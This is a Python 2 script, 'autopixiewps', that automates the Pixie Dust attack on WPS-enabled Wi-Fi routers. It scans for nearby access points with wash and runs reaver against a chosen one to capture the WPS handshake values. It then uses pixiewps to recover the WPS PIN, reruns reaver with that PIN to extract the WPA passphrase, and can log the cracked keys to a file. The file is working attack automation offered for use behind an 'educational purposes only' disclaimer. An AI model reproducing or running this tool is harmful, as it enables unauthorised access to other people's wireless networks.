#!/usr/bin/python
 # autopixiewps 
 #
 # Special thanks to: wiire and anyone working on the pixiedust attack
 #
 # Copyright (c) 2015, nxxxu
 # Version: 1.0.1
 #
 # DISCLAIMER: This tool was made for educational purposes only.
 #             The author is NOT responsible for any misuse or abuse.
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
 # the Free Software Foundation, either version 3 of the License, or
 # (at your option) any later version.
 #
 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 # GNU General Public License for more details.
 #
 # You should have received a copy of the GNU General Public License
 # along with this program. If not, see <http://www.gnu.org/licenses/>.
 #
 # In addition, as a special exception, the copyright holders give
 # permission to link the code of portions of this program with the
 # OpenSSL library under certain conditions as described in each
 # individual source file, and distribute linked combinations
 # including the two.
 # You must obey the GNU General Public License in all respects
 # for all of the code used other than OpenSSL.  If you modify
 # file(s) with this exception, you may extend this exception to your
 # version of the file(s), but you are not obligated to do so.  If you
 # do not wish to do so, delete this exception statement from your
 # version.  If you delete this exception statement from all source
 # files in the program, then also delete it here.



import time
from subprocess import Popen
from subprocess import call
import os
import signal
import re
import sys
hasLog=""
channel=""
bssid=""
interface=""
wlan=""
clr="clear"
def menu():
	global clr
	global interface
	while True:
		menuSelect=""
		os.system(clr)
		print"               ,-.----.                  "
		print"   ,---,       \    /  \            .---."
		print"  '  .' \      |   :    \          /. ./|"
		print" /  ;    '.    |   |  .\ :     .--'.  ' ;"
		print":  :       \   .   :  |: |    /__./ \ : |"
		print":  |   /\   \  |   |   \ :.--'.  '   \\' ."
		print"|  :  ' ;.   : |   : .   /___/ \ |    ' '"
		print"|  |  ;/  \   \;   | |`-';   \  \;      :"
		print"'  :  | \  \ ,'|   | ;    \   ;  `      |"
		print"|  |  '  '--'  :   ' |     .   \    .\  ;"
		print"|  :  :        :   : :      \   \   ' \ |"
		print"|  | ,'","       |   | :       :   '  |----" 
		print"`--''          `---'.|        \   \ ; ///NxXxU   "
		print"                 `---`         '--- v1.0.1"     



		if hasLog == "Yes": print "           settings loaded."
		print
		print "Menu:"
		print "1: Manual input"
		print "2: Wash scan"
		print "3: start mon0 (setup in settings)"
		print "4: settings"
		print "5: Exit"
		print
		menuSelect = raw_input("Option:")

		if menuSelect=="1":Manual()
		elif menuSelect=="2":
			if interface=="":interface = raw_input("interface:")
			if interface=="0":menu()
			Wash()
		elif menuSelect=="3":Startmon()
		elif menuSelect=="4":Settings()
		elif menuSelect=="5":exit()
		elif menuSelect.lower()=="debug":clr=""
		elif menuSelect.lower()=="exit":exit()
		elif menuSelect.lower()=="i know your secrets":print "well you better keep your mouth shut!"

def Manual():
	global interface
	global channel
	global bssid
	global essid
	essid="Not avail from manual attack."
	os.system(clr)
	if interface=="":interface = raw_input("interface:")
	channel = raw_input("channel:")
	if channel == "0":menu()
	bssid = raw_input("bssid:")
	if bssid=="0":menu()
	reaver()


def Wash():
	global bssid
	global channel
	global essid
	if os.path.isfile("APW-Exclude") == True:
		ex = open('APW-Exclude')
		excludedBssid=ex.readlines()
		ex.close()
	else:excludedBssid=""
	fWashOut = open("fWashOut", "w")
	fWashError = open("fWashError", "w")
	pidW = Popen(["wash", "-i", interface, "-C"], stdout=fWashOut, stderr=fWashError).pid
	f = open('fWashOut')
	load="-"
	try:
		while True:
			bssid=[]
			channel=[]
			essid=[]
			pwr=[]
			lock=[]
			line=""
			spacer="- "
			f.seek(0)
			line = "s"		
			while line:
				line = f.readline()
				if "[X]" in line:
					sys.exit("Monitor interface failed!")
				if line[:5] != "BSSID":
					if line[:5] != "-----":
						essid.append (line[84:line.find("\n")])
						bssid.append (line[:17])
						channel.append (line[22:26])
						pwr.append (line[37:41])
						lock.append (line[64:69])
			os.system(clr)
			if len(bssid)==int(1):print "Scan started, No accesspoints with WPS detected yet.", load
			for x in range(0,len(bssid)-1):
				if x == 0:print "Press CTRL+C to stop scan and choose accesspoint"
				if x > 8:spacer="-"
				if any(bssid[x] in s for s in excludedBssid):continue
				if "Y" in lock[x]: print "\033[1;31m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x], "\033[0m\033[1;32m"
				if "N" in lock[x]: print "\033[0m\033[1;32m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x]
			time.sleep(0.5)
			if load=="|":load="/"
			elif load=="/":load="-"
			elif load=="-":load="\\"
			elif load=="\\":load="|"
	except KeyboardInterrupt:
		print 
	os.kill(pidW, signal.SIGQUIT)
	choose = raw_input("accesspoint:")
	if choose == "0":
		if os.path.isfile("fWashOut") == True:os.remove("fWashOut")
		if os.path.isfile("fWashError") == True:os.remove("fWashError")
		menu()
	choose=int(choose)
	bssid=bssid[choose-1]
	channel=channel[choose-1]
	channel.replace(" ", "")
	essid=essid[choose-1]
	f.close()
	if os.path.isfile("fWashOut") == True:os.remove("fWashOut")
	if os.path.isfile("fWashError") == True:os.remove("fWashError")
	reaver()

def Startmon():
	if wlan!="":
		call(["airmon-ng", "start", wlan])
	else:
		print "Wlan card not specified in settings."
		time.sleep(2)

def Settings():
	os.system(clr)
	print "Settings."
	print
	print "1: create new rules"
	print "2: back"
	print
	settingChoose = raw_input("settings:")
	if settingChoose=="1":
		uwlan = raw_input("What physical wlan card to use? (ex. wlan0, wlan1):")
		umon = raw_input("What mon is your default? (ex. mon0):")
		qq = "Use %s as default mon, and do not ask for it later? <y/n>:" % (umon)
		udmon = raw_input(qq)
		ulog = raw_input("store PIN and WPA-keys in logfile? <y/n>:")
		ulogfile = raw_input("Save logfile as (ex. log, log.txt):")

		saves=open("APW-Conf", "w")
		saves.write("wlan:\n")
		uwlan="%s\n" % (uwlan)
		saves.write(uwlan)
		saves.write("mon:\n")
		umon="%s\n" % (umon)
		saves.write(umon)
		saves.write("UseDefMon:\n")
		if udmon.lower()=="y":saves.write("Yes\n")
		else:saves.write("No\n")
		saves.write("UseLog:\n")
		if ulog.lower()=="y":saves.write("Yes\n")
		else:saves.write("No\n")
		saves.write("LogName:\n")
		saves.write(ulogfile)
		saves.write("\n")
		saves.close()
		LoadSettings()
def LoadSettings():
	global hasLog
	global interface
	global logFile
	global wlan
	hasLog="Yes"
	loadS = open('APW-Conf')
	line = loadS.readline()
	while line:
		if line=="wlan:\n":
			line = loadS.readline()
			wlan=line[:line.find("\n")]
		if line=="mon:\n":
			line = loadS.readline()
			interface=line[:line.find("\n")]
		if line=="UseDefMon:\n":
			line=loadS.readline()
			useDm=line[:line.find("\n")]
		if line=="UseLog:\n":
			line = loadS.readline()
			usel=line[:line.find("\n")]
		if line=="LogName:\n":
			line = loadS.readline()
			logFile=line[:line.find("\n")]

		line = loadS.readline()
	if useDm=="No":interface=""
	if usel=="No":lofFile=""

def reaver():
	global PKE
	global PKEb
	global AuthKey
	global AuthKeyb
	global EHash1
	global EHash1b
	global EHash2
	global EHash2b
	global doing
	global Cline
	global bssid
	global WPAkey
	global WPSpin
	global PKR
	global PKRb
	global Enonce
	global Enonceb
	PKR=""
	PKRb=""
	Enonce=""
	Enonceb=""
	WPAkey=""
	WPApin=""
	Cline=[]
	WPSpin=""
	PKE=""
	EHash1=""
	EHash2=""
	AuthKey=""
	PKEb=""
	EHash1b=""
	EHash2b=""
	AuthKeyb=""
	hashing=""
	doing="Retrieving hashes!"
	delsession="%s%s%s" % ("/usr/local/etc/reaver/", re.sub('[^A-Za-z0-9.]+', '', bssid), ".wpc")
	if os.path.isfile(delsession):os.remove(delsession)
	fout = open("fReaverOut", "w")
	ferr = open("fReaverErrors", "w")
	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv"], stdout=fout, stderr=ferr).pid
	f = open("fReaverOut")
	try:
		while True:
			line = f.readline()
			while line:
				if "PKE:" in line:
					PKE=line[line.find("PKE:")+5:line.find("\n")]
					PKEb=len(re.sub('[^A-Fa-f0-9]+', '', PKE))/2,
				if "AuthKey:" in line and AuthKeyb == "":
					AuthKey=line[line.find("AuthKey:")+9:line.find("\n")]
					AuthKeyb=len(re.sub('[^A-Fa-f0-9]+', '', AuthKey))/2,
				if "E-Hash1" in line and EHash1b == "":
					EHash1=line[line.find("E-Hash1:")+9:line.find("\n")]
					EHash1b=len(re.sub('[^A-Fa-f0-9]+', '', EHash1))/2,
				if "E-Hash2" in line:
					EHash2=line[line.find("E-Hash2:")+9:line.find("\n")]
					EHash2b=len(re.sub('[^A-Fa-f0-9]+', '', EHash2))/2,
				if "PKR:" in line:
					PKR=line[line.find("PKR:")+5:line.find("\n")]
					PKRb=len(re.sub('[^A-Fa-f0-9]+', '', PKR))/2,
				if "E-Nonce:" in line:
					Enonce=line[line.find("E-Nonce:")+9:line.find("\n")]
					Enonceb=len(re.sub('[^A-Fa-f0-9]+', '', Enonce))/2,
				if PKE!="" and AuthKey!="" and EHash1!="" and EHash2!="":hashing="done"
				Cline.append (line)
				line = f.readline()
			if not line:status()
			if hashing=="done":
				os.kill(pid, signal.SIGQUIT)
				f.close()
				if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
				if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
				pixie()
			time.sleep(0.1)
	except KeyboardInterrupt:
		print
		f.close()
		if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
		if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
		menu()

def convPin():
	delsession="%s%s%s" % ("/usr/local/etc/reaver/", re.sub('[^A-Za-z0-9.]+', '', bssid), ".wpc")
	if os.path.isfile(delsession):os.remove(delsession)
	global WPAkey
	global line
	fout = open("fReaverOut", "w")
	ferr = open("fReaverErrors", "w")
	pin="--pin=%s" % (WPSpin)
	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", pin], stdout=fout, stderr=ferr).pid
	f = open("fReaverOut")
	try:
		while True:
			line = f.readline()
			while line:
				if "WPA PSK:" in line:break
				line = f.readline()
			if "WPA PSK:" in line:
				WPAkey=line
				break
			if not line:status()
			time.sleep(0.1)
		WPAkey=WPAkey[WPAkey.find("'")+1:]
		WPAkey=WPAkey[:WPAkey.find("'")]
		status()
		print "Cracked!"
		select = raw_input("Would you like to exclude this router from future wash scans? <N/y>:")
		if select.lower()=="y":
			bsside="%s%s" % (bssid,"\n")
			with open("APW-Exclude", "a") as myfile:myfile.write(bsside)
		if logFile!="":
			with open(logFile, "a") as savelog:
				saveinfo="essid:%s bssid:%s WPSpin:%s WPAkey:%s\n" % (essid, bssid, WPSpin, WPAkey)
				savelog.write(saveinfo)
		if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
		if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
		menu()
	except KeyboardInterrupt:
		os.kill(pid, signal.SIGQUIT)
		f.close()
		if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
		if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
		if logFile!="":
			with open(logFile, "a") as savelog:
				saveinfo="essid:%s bssid:%s WPSpin:%s WPAkey:reaver was aborted" % (essid, bssid, WPSpin)
				savelog.write(saveinfo)
		print
		menu()

def status():
	os.system(clr)
	print doing
	print "bssid:%s" % (bssid)
	print "essid:%s" % (essid)
	print
	print "PKE:%s" % (PKEb)
	print "PKR:%s" % (PKRb)
	print "Authkey:%s" % (AuthKeyb)
	print "E-Hash1:%s" % (EHash1b)
	print "E-Hash2:%s" % (EHash2b)
	print "E-Nonce:%s" % (Enonceb)
	print
	if WPSpin:print "PIN:%s" % (WPSpin)
	else:print "PIN:"
	if WPAkey:print "WPA Key:%s" % (WPAkey)
	else:print"WPA key"
	print
	print
	if Cline:
		line=Cline[len(Cline)-1]
		print "\033[1;37;44m%s" % (line[:70]),"\033[0m\033[1;32m"

def pixie():
	global WPSpin
	fout2 = open("fPixiewpsOut", "w")
	ferr2 = open("fPixiewpsErrors", "w")
	runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", Enonce], stdout=fout2, stderr=ferr2)
	Popen.wait(runpixie)

	f = open("fPixiewpsOut")
	line = f.readline()
	while line:
		if "WPS pin:" in line:WPSpin=line
		elif "WPS pin not found!" in line:WPSpin="WPS pin not found!"
		line = f.readline()
	f.close()
	os.remove("fPixiewpsErrors")
	os.remove("fPixiewpsOut")
	doing="Bruteforcing pin!"
	status()
	if WPSpin=="WPS pin not found!":
		pixieS()
	else:
		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]
		convPin()
	

def pixieS():
	global WPSpin
	fout2 = open("fPixiewpsOut", "w")
	ferr2 = open("fPixiewpsErrors", "w")
	runpixie=Popen(["pixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"], stdout=fout2, stderr=ferr2)
	Popen.wait(runpixie)

	f = open("fPixiewpsOut")
	line = f.readline()
	while line:
		if "WPS pin:" in line:WPSpin=line
		elif "WPS pin not found!" in line:WPSpin="WPS pin not found!"
		line = f.readline()
	f.close()
	os.remove("fPixiewpsErrors")
	os.remove("fPixiewpsOut")
	doing="Bruteforcing pin!"
	status()
	if WPSpin=="WPS pin not found!":
		print
		select = raw_input("Would you like to exclude this router from future wash scans? <N/y>:")
		if select.lower()=="y":
			bsside="%s%s" % (bssid,"\n")
			with open("APW-Exclude", "a") as myfile:myfile.write(bsside)
	else:
		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]
		convPin()
	menu()
def exit():
	print"\033[0m"
	#os.system(clr)
	sys.exit("Autopixie has run its course.")

if os.path.isfile("APW-Conf") == True:LoadSettings()
print"\033[1;32m"

menu()

	

